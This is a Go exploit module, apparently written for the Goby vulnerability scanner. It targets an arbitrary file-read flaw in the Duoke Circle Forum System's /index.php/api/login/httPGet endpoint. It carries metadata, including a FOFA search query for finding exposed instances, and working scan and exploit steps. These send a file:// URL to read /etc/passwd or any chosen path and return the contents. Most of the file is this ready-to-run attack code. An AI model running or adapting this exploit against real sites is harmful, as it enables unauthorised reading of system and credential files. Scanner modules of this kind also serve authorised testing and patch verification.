package exploits

import (
	"regexp"
	"strconv"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Duoke Circle Forum System /index.php/api/login/httPGet File Read Vulnerability",
    "Description": "<p>Duoke Circle Forum System a fully open source support for free commercial circle community forum system. The httpGet interface of the Duoke Circle Forum System has an file reading vulnerability.Attackers can use this vulnerability to read important system files (such as system configuration files), resulting in an extremely insecure state of the website.</p>",
    "Product": "Duoke Circle Forum System",
    "Homepage": "https://gitee.com/ZEROBOX/zssdxiaoli",
    "DisclosureDate": "2024-07-05",
    "PostTime": "2024-07-05",
    "Author": "1977250845@qq.com",
    "FofaQuery": "body=\"/static/index/js/jweixin-1.2.0.js\" && title=\"多客\"",
    "GobyQuery": "body=\"/static/index/js/jweixin-1.2.0.js\" && title=\"多客\"",
    "Level": "1",
    "Impact": "<p>The httpGet interface of the Duoke Circle Forum System has an file reading vulnerability.Attackers can use this vulnerability to read important system files (such as system configuration files), resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The official patch has been updated, please upgrade to the latest version. Website address: <a href=\"https://gitee.com/ZEROBOX/zssdxiaoli\">https://gitee.com/ZEROBOX/zssdxiaoli</a></p>",
    "References": [
        "https://cn-sec.com/archives/2835955.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/api/login/httPGet?url=file:///etc/passwd",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/api/login/httPGet?url=file://{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.1",
    "Translation": {
        "CN": {
            "Name": "多客圈子论坛系统   /index.php/api/login/httPGet 文件读取漏洞",
            "Product": "多客圈子论坛系统",
            "Description": "<p>多客圈子论坛系统一款全开源支持免费商用的圈子社区论坛系统。多客圈子论坛系统的httpGet接口存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（系统配置文件）等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>官方已更新补丁，请升级至最新版本。官网地址：<a href=\"https://gitee.com/ZEROBOX/zssdxiaoli\">https://gitee.com/ZEROBOX/zssdxiaoli</a><br></p>",
            "Impact": "<p>多客圈子论坛系统的httpGet接口存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Duoke Circle Forum System /index.php/api/login/httPGet File Read Vulnerability",
            "Product": "Duoke Circle Forum System",
            "Description": "<p>Duoke Circle Forum System a fully open source support for free commercial circle community forum system. The httpGet interface of the&nbsp;Duoke Circle Forum System&nbsp;has an file reading vulnerability.Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as system&nbsp;configuration&nbsp;files),&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "Recommendation": "<p>The official patch has been updated, please upgrade to the latest version. Website address: <a href=\"https://gitee.com/ZEROBOX/zssdxiaoli\">https://gitee.com/ZEROBOX/zssdxiaoli</a><br></p>",
            "Impact": "<p>The httpGet interface of the&nbsp;Duoke Circle Forum System&nbsp;has an file reading vulnerability.Attackers&nbsp;can&nbsp;use&nbsp;this&nbsp;vulnerability&nbsp;to&nbsp;read&nbsp;important&nbsp;system&nbsp;files&nbsp;(such&nbsp;as system&nbsp;configuration&nbsp;files),&nbsp;resulting&nbsp;in&nbsp;an&nbsp;extremely&nbsp;insecure&nbsp;state&nbsp;of&nbsp;the&nbsp;website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10969"
}`
setPayloadRequest := func (hostInfo *httpclient.FixUrl,filePath string)(string,string,int)  {
  requestResult :=""
  url :="/index.php/api/login/httPGet?url=file://"+filePath
  makeRequest := httpclient.NewGetRequestConfig(url)
  makeRequest.VerifyTls = false
  makeRequest.Timeout = 10
  makeRequest.FollowRedirect = false
  makeRequest.Header.Store("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
  if resp,err := httpclient.DoHttpRequest(hostInfo,makeRequest); err ==nil{
    requestResult=resp.RawBody
    return requestResult,url,resp.StatusCode
  }else{
    return requestResult,url,500
  }
}

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul,hostInfo *httpclient.FixUrl,ss *scanconfig.SingleScanConfig) bool{
    runPayload := setPayloadRequest
  
	  text := "/etc/passwd"
	  pocResult,pocUrl,code := runPayload(hostInfo,text)
	  if code != 200{
		return false
	  }
	  if strings.Contains(pocResult,"root"){
		ss.VulURL = hostInfo.FixedHostInfo + pocUrl
		return true
	  }
	  return false
  },
	func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult{
	  runPayload := setPayloadRequest
	  file := goutils.B2S(ss.Params["filePath"])
	  pocResult,_,code := runPayload(expResult.HostInfo,file)
    errorInfo := strconv.Itoa(code)
	  if code != 200{
		  expResult.Success = false
		  expResult.OutputType = "html"
		  expResult.Output = "error!"+"\nhttpSatutsCode:"+errorInfo
      
		  return expResult
	  }
    if len( pocResult) > 0 {
      expResult.Success = true
      expResult.Output = pocResult
    } else {
      expResult.Success = false
      expResult.Output = "error!"+"\nhttpSatutsCode:"+errorInfo
    }
    reHTMLTagsAndContent := regexp.MustCompile(`((.|\n)*?)<div id="think_page_trace"`)
    matches := reHTMLTagsAndContent.FindStringSubmatch(string(expResult.Output))
    contentOnly:=""
    if len(matches) > 1 { // Index 0 is the entire match, index 1 is the first capturing group
      contentOnly = matches[1]
    }
    expResult.Output=contentOnly
	  return expResult
	},
))
}